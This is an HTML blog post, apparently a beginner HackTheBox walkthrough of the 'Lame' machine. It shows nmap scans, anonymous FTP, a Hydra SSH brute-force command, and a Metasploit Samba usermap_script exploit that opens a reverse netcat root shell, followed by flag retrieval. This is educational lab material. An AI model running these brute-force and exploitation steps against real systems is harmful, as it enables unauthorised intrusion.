@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:Jack Collins]">
+<meta name="description" content="Reconnaissance Enumeration Gaining Initial Access Privilege Escalation Capture The Flag Conclusion / TL;DR   Reconnaissance The first thing you&amp;rsquo;ll want to do, when starting any penetration test, is scan for open ports. We&amp;rsquo;ll need to recon the server for the OS and running services, so we can start to figure out an attack vector.
+We&amp;rsquo;ll start with an Nmap scan, although you could easily use another tool. See my Nmap tool guide for further information." />
+<meta name="keywords" content=", pentesting, walkthrough, hackthebox" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://jackcollins.me.uk/articles/htb_example/" />
+
+
+    <title>
+        
+            A very basic HackTheBox pentest example :: Jack Collins  — Linux Admin | Security | Automation | UK
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="https://jackcollins.me.uk/main.b78c3be9451dc4ca61ca377f3dc2cf2e6345a44c2bae46216a322ef366daa399.css" integrity="sha256-t4w76UUdxMphyjd/PcLPLmNFpEwrrkYhajIu82bao5k=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://jackcollins.me.uk/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://jackcollins.me.uk/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://jackcollins.me.uk/favicon-16x16.png">
+    <link rel="manifest" href="https://jackcollins.me.uk/site.webmanifest">
+    <link rel="mask-icon" href="https://jackcollins.me.uk/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://jackcollins.me.uk/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="A very basic HackTheBox pentest example">
+<meta itemprop="description" content="Reconnaissance Enumeration Gaining Initial Access Privilege Escalation Capture The Flag Conclusion / TL;DR   Reconnaissance The first thing you&rsquo;ll want to do, when starting any penetration test, is scan for open ports. We&rsquo;ll need to recon the server for the OS and running services, so we can start to figure out an attack vector.
+We&rsquo;ll start with an Nmap scan, although you could easily use another tool. See my Nmap tool guide for further information."><meta itemprop="datePublished" content="2023-04-10T20:15:08+01:00" />
+<meta itemprop="dateModified" content="2023-04-10T20:15:08+01:00" />
+<meta itemprop="wordCount" content="1867"><meta itemprop="image" content="https://jackcollins.me.uk"/>
+<meta itemprop="keywords" content="pentesting,walkthrough,hackthebox," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://jackcollins.me.uk"/>
+
+<meta name="twitter:title" content="A very basic HackTheBox pentest example"/>
+<meta name="twitter:description" content="Reconnaissance Enumeration Gaining Initial Access Privilege Escalation Capture The Flag Conclusion / TL;DR   Reconnaissance The first thing you&rsquo;ll want to do, when starting any penetration test, is scan for open ports. We&rsquo;ll need to recon the server for the OS and running services, so we can start to figure out an attack vector.
+We&rsquo;ll start with an Nmap scan, although you could easily use another tool. See my Nmap tool guide for further information."/>
+
+
+
+    <meta property="og:title" content="A very basic HackTheBox pentest example" />
+<meta property="og:description" content="Reconnaissance Enumeration Gaining Initial Access Privilege Escalation Capture The Flag Conclusion / TL;DR   Reconnaissance The first thing you&rsquo;ll want to do, when starting any penetration test, is scan for open ports. We&rsquo;ll need to recon the server for the OS and running services, so we can start to figure out an attack vector.
+We&rsquo;ll start with an Nmap scan, although you could easily use another tool. See my Nmap tool guide for further information." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jackcollins.me.uk/articles/htb_example/" /><meta property="og:image" content="https://jackcollins.me.uk"/><meta property="article:section" content="articles" />
+<meta property="article:published_time" content="2023-04-10T20:15:08+01:00" />
+<meta property="article:modified_time" content="2023-04-10T20:15:08+01:00" />
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2023-04-10 20:15:08 &#43;0100 BST" />
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://jackcollins.me.uk/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                jackcollins.me.uk$ </span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://jackcollins.me.uk/articles">Articles</a></li><li><a href="https://jackcollins.me.uk/documents/CV_Jack_Collins_Linux_Admin_2023.pdf">Download CV</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://jackcollins.me.uk/articles/htb_example/">A very basic HackTheBox pentest example</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <ul>
+<li><a href="#recon">Reconnaissance</a></li>
+<li><a href="#enum">Enumeration</a></li>
+<li><a href="#initial">Gaining Initial Access</a></li>
+<li><a href="#escalate">Privilege Escalation</a></li>
+<li><a href="#flag">Capture The Flag</a></li>
+<li><a href="#tldr">Conclusion / TL;DR</a></li>
+</ul>
+<hr>
+<h3 id="recon">Reconnaissance</h3>
+<p>The first thing you&rsquo;ll want to do, when starting any penetration test, is scan for open ports. We&rsquo;ll need to recon the server for the OS and running services, so we can start to figure out an attack vector.<br>
+We&rsquo;ll start with an Nmap scan, although you could easily use another tool. See my Nmap tool guide for further information.</p>
+<p>Let&rsquo;s check the box is up and responding (always worth doing when using a VPN connection through to HackTheBox)</p>
+<blockquote>
+<p>sudo nmap -sn 10.10.10.3</p>
+</blockquote>
+<pre tabindex="0"><code>kali@wlan0:~$ sudo nmap -sn 10.10.10.3
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 15:12 UTC
+Nmap scan report for 10.10.10.3
+Host is up (0.019s latency).
+Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
+</code></pre><p>She&rsquo;s up, so let&rsquo;s take a peek through the keyhole;</p>
+<blockquote>
+<p>sudo nmap -sCV -T4 10.10.10.3</p>
+</blockquote>
+<pre tabindex="0"><code>kali@wlan0:~$ sudo nmap -sCV -T4 10.10.10.3
+	Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 15:14 UTC
+	Nmap scan report for 10.10.10.3
+	Host is up (0.019s latency).
+	Not shown: 996 filtered ports
+	PORT    STATE SERVICE     VERSION
+	21/tcp  open  ftp         vsftpd 2.3.4
+	|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+	| ftp-syst: 
+	|   STAT: 
+	| FTP server status:
+	|      Connected to 10.10.14.2
+	|      Logged in as ftp
+	|      TYPE: ASCII
+	|      No session bandwidth limit
+	|      Session timeout in seconds is 300
+	|      Control connection is plain text
+	|      Data connections will be plain text
+	|      vsFTPd 2.3.4 - secure, fast, stable
+	|_End of status
+	22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+	| ssh-hostkey: 
+	|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+	|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+	
+	Host script results:
+	|_clock-skew: mean: 2h10m32s, deviation: 2h49m45s, median: 10m29s
+	| smb-os-discovery: 
+	|   OS: Unix (Samba 3.0.20-Debian)
+	|   Computer name: lame
+	|   NetBIOS computer name: 
+	|   Domain name: hackthebox.gr
+	|   FQDN: lame.hackthebox.gr
+	|_  System time: 2021-03-14T11:25:21-04:00
+	| smb-security-mode: 
+	|   account_used: guest
+	|   authentication_level: user
+	|   challenge_response: supported
+	|_  message_signing: disabled (dangerous, but default)
+	|_smb2-time: Protocol negotiation failed (SMB2)
+	
+	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 65.58 seconds
+</code></pre><hr>
+<h3 id="enum">Enumeration</h3>
+<p>So, based on our Nmap scan, we&rsquo;ve established 4 open ports, with 3 possible attack vectors.</p>
+<h4 id="port-21---file-transfer-protocol-ftp">Port 21 - File Transfer Protocol (FTP)</h4>
+<p>As we can see from the output of nmap, specifically <strong>&ldquo;ftp-anon: Anonymous FTP login allowed (FTP code 230)&quot;</strong>, there is a File Transfer Protocol running on port 21, with Anonymous login allowed.</p>
+<p>We&rsquo;ll want to take a look at this and see what it holds. Anonymous login allows us to at least see the files that are available via the following;</p>
+<blockquote>
+<p>ftp 10.10.10.3</p>
+</blockquote>
+<pre tabindex="0"><code>Connected to 10.10.10.3.
+220 (vsFTPd 2.3.4)
+</code></pre><p>When prompted for credentials, use &lsquo;anonymous&rsquo; for the user Name and leave the Password blank;</p>
+<pre tabindex="0"><code>Name (10.10.10.3:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</code></pre><blockquote>
+<p>ftp&gt; ls -la</p>
+</blockquote>
+<pre tabindex="0"><code>200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
+drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
+226 Directory send OK.
+</code></pre><blockquote>
+<p>ftp&gt; pwd</p>
+</blockquote>
+<pre tabindex="0"><code>257 &quot;/&quot;
+</code></pre><p>Unfortunately there&rsquo;s nothing there, and we&rsquo;re already in the highest possible directory location. Whilst there&rsquo;s potentially more possibilities for FTP, let&rsquo;s move on to take a look at another attack vector. We can always come back to this if needs be.</p>
+<p>It&rsquo;s worth nothing to <em>always</em> use ls -la (a for &lsquo;all&rsquo;), to make sure we don&rsquo;t miss any hidden files.</p>
+<h4 id="port-22---secure-shell-ssh">Port 22 - Secure Shell (SSH)</h4>
+<p>Our Nmap scan has established the version of SSH that is running on the target; <strong>OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</strong></p>
+<p>We can also establish the version of SSH that is running by grabbing the SSH Banner from the server using Netcat;</p>
+<blockquote>
+<p>nc 10.10.10.3 22</p>
+</blockquote>
+<pre tabindex="0"><code>SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
+</code></pre><p>Whilst bruteforcing SSH may come to mind, we generally don&rsquo;t want to try this, because it&rsquo;s loud and it almost never works (hardly any SSH logins are going to allow bruteforce, as the account will lock out or the constant connections will be blocked).<br>
+If you really wanted to attempt a bruteforce of SSH, you could do so via Metasploit&rsquo;s ssh_login module, or with Hydra by using;</p>
+<blockquote>
+<p>hydra -l root-P passwords.txt 10.10.10.3 -t 4 ssh</p>
+</blockquote>
+<p>You can use lowercase &lsquo;l&rsquo; and &lsquo;p&rsquo; options for a single userID or password, or uppercase to use wordlists. We&rsquo;d have to know at least one or a few userIDs to make this even worth attempting. &lsquo;admin&rsquo; and &lsquo;root&rsquo; are sometimes worth a try.</p>
+<p>Feel free to attempt this against HackTheBox&rsquo;s Lame server, but I didn&rsquo;t have much luck, after letting it run using the rockyou.txt password list, for a while.<br>
+I was getting a super-speedy 28 attempts per minute, which just isn&rsquo;t worth the effort. Try this if you have a good gist of what the userid and password might be, or a short list thereof.</p>
+<p>We can also take a quick look at whether there are any known exploits for the SSH version that is running;</p>
+<blockquote>
+<p>searchsploit ssh 4.7</p>
+</blockquote>
+<pre tabindex="0"><code>Exploit Title
+---------------------------------------------------------------
+Fortinet FortiGate 4.x &lt; 5.0.7 - SSH Backdoor Access 
+OpenSSH 2.3 &lt; 7.7 - Username Enumeration
+OpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC)
+OpenSSH &lt; 6.6 SFTP (x64) - Command Execution
+OpenSSH &lt; 6.6 SFTP - Command Execution
+OpenSSH &lt; 7.4 - Forwarded Unix Domain Sockets Privilege Escalation
+OpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading
+OpenSSH &lt; 7.7 - User Enumeration (2)
+---------------------------------------------------------------
+</code></pre><p>As we can see from the results, there&rsquo;s some decent looking vulnerabilities that would potentially work against SSH 4.7, however none of them appear to offer the reverse shell capabilities we are looking for.<br>
+Username Enumeration might be useful if we then wanted to go and complete a slow SSH bruteforce attack with Hydra, as above, but that&rsquo;s still too slow for us here.</p>
+<p>The only juicy looking one would be that SSH Backdoor Access, but Unfortunately it only appears to work against FortiGate SSH.</p>
+<p>Similar to the FTP port, there might be something more useful here, based on the fact that the server uses an old SSH version, however for Enumeration we want to quickly look at all our options. We can always dive in further should we not find anything of use on the other ports.<br>
+Therefore, we&rsquo;ll now look at the last potential attack vector, via open port information, Samba.</p>
+<h4 id="ports-139--445---samba-smb">Ports 139 &amp; 445 - Samba (SMB)</h4>
+<p>Nmap has established that the version of Samba running is 3.0.20, so let&rsquo;s use searchsploit again and see if there are any vulnerabilities for that;</p>
+<blockquote>
+<p>searchsploit samba 3.0.20</p>
+</blockquote>
+<pre tabindex="0"><code>Exploit Title
+---------------------------------------------------------------
+Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass
+Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
+Samba &lt; 3.0.20 - Remote Heap Overflow
+Samba &lt; 3.0.20 - Remote Heap Overflow
+Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)
+---------------------------------------------------------------
+</code></pre><p>Now that is a juicy result!</p>
+<p>As we can see, a number of vulnerabilities specific to the version 3.0.20 of SMB have been identified, but the jackpot is the second one down.
+Note the mention of Metasploit and Command Execution. That means there&rsquo;s a Metasploit module specifically designed to exploit this version of Samba, and likely get a reverse shell.</p>
+<hr>
+<h3 id="init">Gaining Initial Access</h3>
+<p>We&rsquo;re going to use Metasploit, as suggested by searchsploit above, to see if we can get a reverse shell to HackTheBox&rsquo;s Lame server.<br>
+If you&rsquo;ve not used Metasploit before, I would advise reading up a little on it first. It can be quite in-depth and I&rsquo;ll only be touched surface-level commands here.</p>
+<p>Open MSFConsole;</p>
+<blockquote>
+<p>msfconsole</p>
+</blockquote>
+<p>Then search for the same version of Samba so we can identify the exploit mentioned by searchsploit;</p>
+<blockquote>
+<p>search samba 3.0.20</p>
+</blockquote>
+<pre tabindex="0"><code>Matching Modules
+================
+
+#  Name                                Disclosure Date  Rank       Check  Description
+-  ----                                ---------------  ----       -----  -----------
+0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba &quot;username map script&quot; Command Execution
+</code></pre><p>Well, there&rsquo;s only one, but it&rsquo;s definitely the juicy one we indentified above.
+Let&rsquo;s load the exploit in to Metasploit, and set some options;</p>
+<blockquote>
+<p>use exploit/multi/samba/usermap_script</p>
+</blockquote>
+<pre tabindex="0"><code>msf6 exploit(multi/samba/usermap_script) &gt; 
+</code></pre><blockquote>
+<p>show options</p>
+</blockquote>
+<pre tabindex="0"><code>Module options (exploit/multi/samba/usermap_script):
+
+Name    Current Setting  Required  Description
+----    ---------------  --------  -----------
+RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
+RPORT   139              yes       The target port (TCP)
+
+Payload options (cmd/unix/reverse_netcat):
+ 
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LHOST  192.168.1.43     yes       The listen address (an interface may be specified)
+LPORT  4444             yes       The listen port
+
+Exploit target:
+
+Id  Name
+--  ----
+0   Automatic
+</code></pre><p>We&rsquo;ll want to set RHOSTS to the IP of the target box and LHOST to our IP.</p>
+<p><strong>Important Note</strong>: When using HackTheBox&rsquo;s VPN, you&rsquo;ll need to assign the IP of the openvpn connection as LHOST. To find this out, run <em>ip a</em> or <em>ifconfig</em> and use the IP listed under &lsquo;tun0&rsquo;., likely to be a 10.10.X.X address.</p>
+<blockquote>
+<p>msf6 exploit(multi/samba/usermap_script) &gt; set RHOSTS 10.10.10.3</p>
+</blockquote>
+<pre tabindex="0"><code>RHOSTS =&gt; 10.10.10.3
+</code></pre><blockquote>
+<p>msf6 exploit(multi/samba/usermap_script) &gt; set LHOST 10.10.14.2</p>
+</blockquote>
+<pre tabindex="0"><code>LHOST =&gt; 10.10.14.2
+</code></pre><p>In this case, we can leave the default payload as cmd/unix/reverse_netcat. Now run it;</p>
+<blockquote>
+<p>exploit</p>
+</blockquote>
+<pre tabindex="0"><code>[*] Started reverse TCP handler on 10.10.14.2:4444 
+[*] Command shell session 1 opened (10.10.14.2:4444 -&gt; 10.10.10.3:53267) at 2021-03-14 19:39:35 +0000
+</code></pre><p>Success! We&rsquo;re in!</p>
+<hr>
+<h3 id="escalate">Privilege Escalation</h3>
+<p>Now that we have a shell, let&rsquo;s see who we are;</p>
+<blockquote>
+<p>whoami</p>
+</blockquote>
+<pre tabindex="0"><code>root
+</code></pre><p>It must be Christmas! No Privilege Escalation is required here, we&rsquo;re already root!<br>
+Time to grab those flags.</p>
+<hr>
+<h3 id="flag">Capture The Flag</h3>
+<p>We know we have a user and a root flag to find, so let&rsquo;s start by finding out where we are and moving around.<br>
+Given that we know this is a Linux box, from our earlier Nmap scan and simply by spending a little time on the console, we can make an assumption that the user flag might be somewhere in a user&rsquo;s home directory, so let&rsquo;s take a look at /home</p>
+<blockquote>
+<p>pwd</p>
+</blockquote>
+<pre tabindex="0"><code>/
+</code></pre><blockquote>
+<p>cd /home
+ls</p>
+</blockquote>
+<pre tabindex="0"><code>ftp
+makis
+service
+user
+</code></pre><blockquote>
+<p>ls makis</p>
+</blockquote>
+<pre tabindex="0"><code>user.txt
+</code></pre><p>Bingo. We can cat the user.txt file in /home/makis to get the User Flag and complete the first challenge.</p>
+<p>Now, given that we know the User Flag was in a file called user.txt, we can make an assumption that the root flag might be in a file called root.txt.<br>
+Rather than traverse around trying to look for it, let&rsquo;s try a search instead;</p>
+<blockquote>
+<p>find / -name &ldquo;root.txt&rdquo;</p>
+</blockquote>
+<pre tabindex="0"><code>/root/root.txt
+</code></pre><p>And there we have it! We can cat that file for the Root Flag and complete the second challenge.</p>
+<p>We&rsquo;ve now owned and completed HackTheBox&rsquo;s Lame server.</p>
+<hr>
+<h3 id="tldr">Conclusion / TL;DR</h3>
+<p>In conclusion, then, we found multiple ports open on 10.10.10.3 with out-of-date services running on them.<br>
+By checking searchsploit we narrowed down that there was a Metasploit vulnerability available for the SMB version that was running.</p>
+<p>Once we successfully ran the exploit, we not only gained access to the box, but we were root right off the bat! So no Privilege Escalation required here.</p>
+<p>On the server, we used simple logic to determine that the user.txt Flag was inside a user&rsquo;s Home Directory, &lsquo;matis&rsquo;, and then used find to search for root.txt.</p>
+<hr>
+<p><a href="#top">Top of page</a></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://jackcollins.me.uk/tags/pentesting/">pentesting</a></span>
+        <span class="tag"><a href="https://jackcollins.me.uk/tags/walkthrough/">walkthrough</a></span>
+        <span class="tag"><a href="https://jackcollins.me.uk/tags/hackthebox/">hackthebox</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Created in Linux CLI using <a href="http://gohugo.io">Hugo</a></span><span>Self Hosted via AWS Amplify</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://jackcollins.me.uk/bundle.min.644292943ae47eef02fcd64b11757aeb8caeeaebf473a823b62099edccac808e8d82689359f285e5d95994e5ad5ae3b9c1ccc281eb1828e67d0ba6630f95b832.js" integrity="sha512-ZEKSlDrkfu8C/NZLEXV664yu6uv0c6gjtiCZ7cysgI6NgmiTWfKF5dlZlOWtWuO5wczCgesYKOZ9C6ZjD5W4Mg=="></script>
+
+
+
+    </body>
+</html>
